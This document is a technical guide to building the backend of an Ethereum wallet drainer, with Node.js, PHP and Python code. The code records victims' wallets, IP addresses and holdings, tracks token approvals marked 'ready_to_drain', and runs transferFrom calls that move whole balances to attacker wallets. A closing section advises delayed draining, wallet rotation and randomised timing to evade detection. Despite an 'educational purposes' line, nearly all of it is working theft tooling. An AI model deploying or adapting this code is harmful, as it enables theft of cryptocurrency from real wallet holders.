## Code Examples for Approval Tracking and Draining Logic in EVM Wallet Drainer Backends

This document provides conceptual code examples and explanations of how EVM wallet drainer backends track approval events and manage the draining process. These examples are based on common web development patterns and blockchain interaction techniques that could be repurposed for malicious activities. The examples are provided for educational purposes to understand how these systems operate.

### 1. Backend API Endpoints for Tracking Approvals

#### Node.js with Express and ethers.js Example

```javascript
// server.js - A simplified example of a Node.js backend for a wallet drainer
const express = require('express');
const { ethers } = require('ethers');
const mongoose = require('mongoose');
const cors = require('cors');
const bodyParser = require('body-parser');

// Connect to MongoDB
mongoose.connect('mongodb://localhost:27017/drainer_db', { useNewUrlParser: true });

// Define victim schema
const victimSchema = new mongoose.Schema({
  walletAddress: { type: String, required: true, unique: true },
  ipAddress: String,
  userAgent: String,
  firstSeen: { type: Date, default: Date.now },
  lastActive: { type: Date, default: Date.now },
  chainId: Number,
  assets: {
    nativeBalance: String,
    erc20Tokens: [{ 
      contractAddress: String, 
      symbol: String, 
      balance: String 
    }],
    nfts: [{ 
      contractAddress: String, 
      tokenIds: [String] 
    }]
  },
  approvals: [{
    tokenContract: String,
    tokenType: { type: String, enum: ['ERC20', 'ERC721', 'ERC1155'] },
    spender: String,
    amount: String,
    timestamp: { type: Date, default: Date.now },
    status: { type: String, enum: ['pending', 'ready_to_drain', 'drained', 'failed'], default: 'pending' }
  }],
  drainTransactions: [{
    txHash: String,
    tokenContract: String,
    amount: String,
    receiver: String,
    status: String,
    timestamp: { type: Date, default: Date.now }
  }]
});

const Victim = mongoose.model('Victim', victimSchema);

// Initialize Express app
const app = express();
app.use(cors());
app.use(bodyParser.json());

// Endpoint to log new victim connection
app.post('/api/connect', async (req, res) => {
  try {
    const { walletAddress, ipAddress, userAgent, chainId } = req.body;
    
    // Create or update victim record
    let victim = await Victim.findOne({ walletAddress });
    
    if (!victim) {
      victim = new Victim({
        walletAddress,
        ipAddress,
        userAgent,
        chainId
      });
    } else {
      victim.lastActive = Date.now();
      victim.ipAddress = ipAddress;
    }
    
    await victim.save();
    console.log(`[+] New victim connected: ${walletAddress}`);
    
    res.status(200).json({ success: true });
  } catch (error) {
    console.error('Error logging connection:', error);
    res.status(500).json({ success: false, error: 'Internal server error' });
  }
});

// Endpoint to log discovered assets
app.post('/api/assets', async (req, res) => {
  try {
    const { walletAddress, nativeBalance, erc20Tokens, nfts } = req.body;
    
    const victim = await Victim.findOne({ walletAddress });
    if (!victim) {
      return res.status(404).json({ success: false, error: 'Victim not found' });
    }
    
    victim.assets = {
      nativeBalance,
      erc20Tokens,
      nfts
    };
    victim.lastActive = Date.now();
    
    await victim.save();
    console.log(`[+] Assets logged for ${walletAddress}`);
    
    res.status(200).json({ success: true });
  } catch (error) {
    console.error('Error logging assets:', error);
    res.status(500).json({ success: false, error: 'Internal server error' });
  }
});

// Endpoint to log approval events
app.post('/api/approval', async (req, res) => {
  try {
    const { walletAddress, tokenContract, tokenType, spender, amount } = req.body;
    
    const victim = await Victim.findOne({ walletAddress });
    if (!victim) {
      return res.status(404).json({ success: false, error: 'Victim not found' });
    }
    
    // Add new approval to the victim's record
    victim.approvals.push({
      tokenContract,
      tokenType,
      spender,
      amount,
      status: 'ready_to_drain'
    });
    
    victim.lastActive = Date.now();
    await victim.save();
    
    console.log(`[+] New approval logged for ${walletAddress}: ${tokenContract}`);
    
    // Return the next action to take (e.g., which token to request approval for next)
    // or signal that draining can begin
    res.status(200).json({ 
      success: true,
      nextAction: 'drain', // or 'request_approval', etc.
      targetToken: null // next token to request approval for, if applicable
    });
  } catch (error) {
    console.error('Error logging approval:', error);
    res.status(500).json({ success: false, error: 'Internal server error' });
  }
});

// Endpoint to log successful drain transactions
app.post('/api/drain_complete', async (req, res) => {
  try {
    const { walletAddress, txHash, tokenContract, amount, receiver } = req.body;
    
    const victim = await Victim.findOne({ walletAddress });
    if (!victim) {
      return res.status(404).json({ success: false, error: 'Victim not found' });
    }
    
    // Update the approval status
    const approval = victim.approvals.find(a => 
      a.tokenContract === tokenContract && a.status === 'ready_to_drain');
    
    if (approval) {
      approval.status = 'drained';
    }
    
    // Add the drain transaction
    victim.drainTransactions.push({
      txHash,
      tokenContract,
      amount,
      receiver,
      status: 'success'
    });
    
    victim.lastActive = Date.now();
    await victim.save();
    
    console.log(`[+] Drain completed for ${walletAddress}: ${tokenContract}, amount: ${amount}`);
    
    res.status(200).json({ success: true });
  } catch (error) {
    console.error('Error logging drain completion:', error);
    res.status(500).json({ success: false, error: 'Internal server error' });
  }
});

// Endpoint to get configuration for the frontend drainer
app.get('/api/config', (req, res) => {
  // Return configuration including receiving wallets, target tokens, etc.
  res.json({
    receivingWallets: {
      erc20: '0xAttackerERC20ReceivingWallet',
      nft: '0xAttackerNFTReceivingWallet',
      native: '0xAttackerNativeReceivingWallet'
    },
    targetTokens: [
      { address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', symbol: 'USDT', priority: 1 },
      { address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', symbol: 'USDC', priority: 2 },
      // More tokens...
    ],
    // Other configuration...
  });
});

// Start the server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
```

#### PHP Backend Example

```php
<?php
// approval_logger.php - A simplified PHP script to log approval events

// Enable error reporting for debugging
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Set headers to allow cross-origin requests and JSON content type
header("Access-Control-Allow-Origin: *");
header("Content-Type: application/json; charset=UTF-8");
header("Access-Control-Allow-Methods: POST");
header("Access-Control-Allow-Headers: Content-Type, Access-Control-Allow-Headers, Authorization, X-Requested-With");

// Database connection
$servername = "localhost";
$username = "drainer_user";
$password = "drainer_password";
$dbname = "drainer_db";

// Create connection
$conn = new mysqli($servername, $username, $password, $dbname);

// Check connection
if ($conn->connect_error) {
    die(json_encode(["success" => false, "message" => "Connection failed"]));
}

// Get posted data
$data = json_decode(file_get_contents("php://input"), true);

// Validate required fields
if (
    !isset($data['wallet_address']) || 
    !isset($data['token_contract']) || 
    !isset($data['token_type']) || 
    !isset($data['spender']) || 
    !isset($data['amount'])
) {
    http_response_code(400);
    echo json_encode(["success" => false, "message" => "Missing required fields"]);
    exit();
}

// Extract data
$walletAddress = $conn->real_escape_string($data['wallet_address']);
$tokenContract = $conn->real_escape_string($data['token_contract']);
$tokenType = $conn->real_escape_string($data['token_type']);
$spender = $conn->real_escape_string($data['spender']);
$amount = $conn->real_escape_string($data['amount']);
$timestamp = date('Y-m-d H:i:s');

// Check if victim exists
$checkVictim = $conn->query("SELECT id FROM victims WHERE wallet_address = '$walletAddress'");

if ($checkVictim->num_rows == 0) {
    // Create new victim record if not exists
    $conn->query("INSERT INTO victims (wallet_address, first_seen, last_active) 
                 VALUES ('$walletAddress', '$timestamp', '$timestamp')");
    $victimId = $conn->insert_id;
} else {
    $victim = $checkVictim->fetch_assoc();
    $victimId = $victim['id'];
    // Update last active timestamp
    $conn->query("UPDATE victims SET last_active = '$timestamp' WHERE id = $victimId");
}

// Log the approval
$sql = "INSERT INTO approvals (victim_id, token_contract, token_type, spender, amount, timestamp, status) 
        VALUES ($victimId, '$tokenContract', '$tokenType', '$spender', '$amount', '$timestamp', 'ready_to_drain')";

if ($conn->query($sql) === TRUE) {
    // Log to file as well (redundancy)
    $logEntry = "[" . $timestamp . "] APPROVAL: " . $walletAddress . " approved " . $tokenType . " " . $tokenContract . " for spender " . $spender . "\n";
    file_put_contents("../logs/approvals.log", $logEntry, FILE_APPEND);
    
    // Return success and next action
    echo json_encode([
        "success" => true, 
        "next_action" => "drain", 
        "target_token" => null
    ]);
} else {
    echo json_encode(["success" => false, "message" => "Error: " . $conn->error]);
}

$conn->close();
?>
```

### 2. Draining Logic Implementation

The draining process can be implemented in two main ways:

1. **Frontend-Initiated Draining**: The victim is tricked into signing transactions that directly transfer assets.
2. **Backend-Initiated Draining**: The backend uses the approvals to initiate transfers after the victim has disconnected.

#### Backend-Initiated Draining Script (Node.js with ethers.js)

```javascript
// drain_processor.js - Script to process pending approvals and drain assets
const { ethers } = require('ethers');
const mongoose = require('mongoose');

// ERC20 ABI (minimal for transferFrom)
const ERC20_ABI = [
  "function transferFrom(address sender, address recipient, uint256 amount) returns (bool)",
  "function balanceOf(address account) view returns (uint256)"
];

// Connect to MongoDB
mongoose.connect('mongodb://localhost:27017/drainer_db', { useNewUrlParser: true });

// Import Victim model (same schema as in server.js)
const Victim = mongoose.model('Victim');

// Configure blockchain provider
const provider = new ethers.providers.JsonRpcProvider('https://mainnet.infura.io/v3/YOUR_INFURA_KEY');
const privateKey = 'YOUR_PRIVATE_KEY'; // Private key of the attacker's wallet that was set as the spender
const wallet = new ethers.Wallet(privateKey, provider);

// Function to drain approved ERC20 tokens
async function drainApprovedERC20(approval, victim) {
  try {
    const tokenContract = new ethers.Contract(approval.tokenContract, ERC20_ABI, wallet);
    
    // Get victim's current balance
    const balance = await tokenContract.balanceOf(victim.walletAddress);
    
    if (balance.isZero()) {
      console.log(`No balance to drain for ${victim.walletAddress} on token ${approval.tokenContract}`);
      approval.status = 'failed';
      approval.statusMessage = 'Zero balance';
      return false;
    }
    
    // Create transaction to transfer tokens from victim to attacker
    const receivingWallet = '0xAttackerReceivingWallet'; // Could be different from the spender wallet
    
    console.log(`Attempting to drain ${balance.toString()} tokens from ${victim.walletAddress} to ${receivingWallet}`);
    
    // Execute the transferFrom transaction
    const tx = await tokenContract.transferFrom(victim.walletAddress, receivingWallet, balance);
    console.log(`Transaction sent: ${tx.hash}`);
    
    // Wait for transaction to be mined
    const receipt = await tx.wait();
    console.log(`Transaction confirmed: ${receipt.transactionHash}`);
    
    // Update approval status
    approval.status = 'drained';
    
    // Add drain transaction record
    victim.drainTransactions.push({
      txHash: receipt.transactionHash,
      tokenContract: approval.tokenContract,
      amount: balance.toString(),
      receiver: receivingWallet,
      status: 'success',
      timestamp: new Date()
    });
    
    return true;
  } catch (error) {
    console.error(`Error draining tokens for ${victim.walletAddress}:`, error);
    approval.status = 'failed';
    approval.statusMessage = error.message;
    return false;
  }
}

// Main function to process all pending approvals
async function processPendingApprovals() {
  try {
    // Find all victims with approvals ready to drain
    const victims = await Victim.find({
      'approvals.status': 'ready_to_drain'
    });
    
    console.log(`Found ${victims.length} victims with pending approvals`);
    
    for (const victim of victims) {
      console.log(`Processing victim: ${victim.walletAddress}`);
      
      // Process each approval for this victim
      for (let i = 0; i < victim.approvals.length; i++) {
        const approval = victim.approvals[i];
        
        if (approval.status !== 'ready_to_drain') {
          continue;
        }
        
        console.log(`Processing approval for token: ${approval.tokenContract}`);
        
        // Process based on token type
        if (approval.tokenType === 'ERC20') {
          await drainApprovedERC20(approval, victim);
        }
        // Add handlers for ERC721, ERC1155, etc.
      }
      
      // Save updated victim record
      await victim.save();
    }
    
    console.log('Finished processing pending approvals');
  } catch (error) {
    console.error('Error processing approvals:', error);
  } finally {
    mongoose.disconnect();
  }
}

// Run the processor
processPendingApprovals();
```

#### Python Backend Draining Script (with Web3.py)

```python
# drain_processor.py - Python script to process approvals and drain assets
import time
import json
import logging
from datetime import datetime
from web3 import Web3
from pymongo import MongoClient

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    filename='drain_processor.log'
)

# Connect to MongoDB
client = MongoClient('mongodb://localhost:27017/')
db = client['drainer_db']
victims_collection = db['victims']

# Configure Web3 provider
w3 = Web3(Web3.HTTPProvider('https://mainnet.infura.io/v3/YOUR_INFURA_KEY'))

# Attacker's wallet
PRIVATE_KEY = 'YOUR_PRIVATE_KEY'  # Private key of the spender wallet
ACCOUNT = w3.eth.account.from_key(PRIVATE_KEY)
RECEIVING_WALLET = '0xAttackerReceivingWallet'  # Could be different from the spender

# Minimal ERC20 ABI for transferFrom
ERC20_ABI = [
    {
        "constant": False,
        "inputs": [
            {"name": "sender", "type": "address"},
            {"name": "recipient", "type": "address"},
            {"name": "amount", "type": "uint256"}
        ],
        "name": "transferFrom",
        "outputs": [{"name": "", "type": "bool"}],
        "payable": False,
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "constant": True,
        "inputs": [{"name": "account", "type": "address"}],
        "name": "balanceOf",
        "outputs": [{"name": "", "type": "uint256"}],
        "payable": False,
        "stateMutability": "view",
        "type": "function"
    }
]

def drain_erc20(victim, approval):
    """Drain approved ERC20 tokens from victim"""
    try:
        token_contract_address = Web3.to_checksum_address(approval['tokenContract'])
        victim_address = Web3.to_checksum_address(victim['walletAddress'])
        receiving_address = Web3.to_checksum_address(RECEIVING_WALLET)
        
        # Create contract instance
        token_contract = w3.eth.contract(address=token_contract_address, abi=ERC20_ABI)
        
        # Check victim's balance
        balance = token_contract.functions.balanceOf(victim_address).call()
        
        if balance == 0:
            logging.info(f"No balance to drain for {victim_address} on token {token_contract_address}")
            return False
        
        logging.info(f"Attempting to drain {balance} tokens from {victim_address} to {receiving_address}")
        
        # Build transaction
        nonce = w3.eth.get_transaction_count(ACCOUNT.address)
        tx = token_contract.functions.transferFrom(
            victim_address,
            receiving_address,
            balance
        ).build_transaction({
            'chainId': 1,  # Ethereum mainnet
            'gas': 100000,
            'gasPrice': w3.eth.gas_price,
            'nonce': nonce,
        })
        
        # Sign and send transaction
        signed_tx = w3.eth.account.sign_transaction(tx, PRIVATE_KEY)
        tx_hash = w3.eth.send_raw_transaction(signed_tx.rawTransaction)
        
        logging.info(f"Transaction sent: {tx_hash.hex()}")
        
        # Wait for transaction to be mined
        receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
        
        if receipt.status == 1:
            logging.info(f"Transaction successful: {tx_hash.hex()}")
            
            # Update MongoDB
            victims_collection.update_one(
                {"walletAddress": victim['walletAddress'], "approvals.tokenContract": approval['tokenContract']},
                {
                    "$set": {"approvals.$.status": "drained"},
                    "$push": {
                        "drainTransactions": {
                            "txHash": tx_hash.hex(),
                            "tokenContract": approval['tokenContract'],
                            "amount": str(balance),
                            "receiver": receiving_address,
                            "status": "success",
                            "timestamp": datetime.now()
                        }
                    }
                }
            )
            return True
        else:
            logging.error(f"Transaction failed: {tx_hash.hex()}")
            return False
            
    except Exception as e:
        logging.error(f"Error draining tokens: {str(e)}")
        
        # Update approval status to failed
        victims_collection.update_one(
            {"walletAddress": victim['walletAddress'], "approvals.tokenContract": approval['tokenContract']},
            {"$set": {"approvals.$.status": "failed", "approvals.$.statusMessage": str(e)}}
        )
        return False

def process_pending_approvals():
    """Process all pending approvals"""
    try:
        # Find victims with approvals ready to drain
        victims = victims_collection.find({"approvals.status": "ready_to_drain"})
        
        for victim in victims:
            logging.info(f"Processing victim: {victim['walletAddress']}")
            
            for approval in victim['approvals']:
                if approval['status'] != 'ready_to_drain':
                    continue
                
                logging.info(f"Processing approval for token: {approval['tokenContract']}")
                
                # Process based on token type
                if approval['tokenType'] == 'ERC20':
                    drain_erc20(victim, approval)
                # Add handlers for ERC721, ERC1155, etc.
    
    except Exception as e:
        logging.error(f"Error processing approvals: {str(e)}")

if __name__ == "__main__":
    logging.info("Starting drain processor")
    process_pending_approvals()
    logging.info("Drain processor completed")
```

### 3. Key Concepts in Approval Tracking and Draining

1. **Approval Tracking**:
   - The frontend drainer script notifies the backend when a victim approves a token.
   - The backend logs this approval with a status (e.g., "ready_to_drain").
   - This creates a queue of assets that can be drained.

2. **Draining Strategies**:
   - **Immediate Draining**: The frontend can immediately request the victim to sign a transfer transaction after approval.
   - **Delayed Draining**: The backend can process approvals later, which is less suspicious and allows for batching.
   - **Selective Draining**: The backend might prioritize high-value assets or specific tokens.

3. **Error Handling and Retry Logic**:
   - Draining attempts might fail due to network issues, gas price changes, or other factors.
   - Sophisticated backends implement retry mechanisms with increasing delays.
   - Failed attempts are logged for manual review by the attacker.

4. **Operational Security**:
   - Receiving wallets are often rotated to avoid detection.
   - Transactions might be batched to reduce gas costs and blockchain footprint.
   - Some drainers implement delays or randomization to appear less bot-like.

These code examples illustrate the technical implementation of approval tracking and draining logic in wallet drainer backends. Understanding these patterns is crucial for security researchers and blockchain security tools to detect and mitigate such threats.
